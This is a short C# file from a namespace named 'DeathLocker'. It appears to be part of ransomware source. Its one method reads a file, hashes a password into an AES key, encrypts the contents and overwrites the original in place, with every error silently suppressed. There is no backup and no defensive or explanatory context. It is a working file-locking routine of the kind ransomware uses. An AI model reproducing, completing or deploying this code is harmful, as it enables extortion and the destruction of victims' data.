using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace DeathLocker;

public class EncryptionFile
{
	public void EncryptFile(string file, string password)
	{
		try
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
		catch
		{
		}
	}
}
